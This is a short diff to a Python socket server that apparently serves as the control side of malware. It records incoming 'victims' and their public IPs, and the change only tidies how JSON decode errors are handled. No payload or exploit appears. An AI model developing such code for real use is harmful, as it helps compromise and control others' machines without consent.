@@ -1,5 +1,4 @@
 import json, select, socket, hashlib
-from json import JSONDecodeError
 
 from const import Const
 from victim import Victim
@@ -61,8 +60,7 @@ class Server:
                             self.victims.append(Victim(info=info, sock=sock))
                             print(f'[+] Got connection from: {info['public_ip']}')
 
-                        except JSONDecodeError:
-                            print('Can\'t decode json(')
+                        except json.JSONDecodeError:
+                            sock.close()
 
-                        # sock.close()
                         inputs.remove(sock)
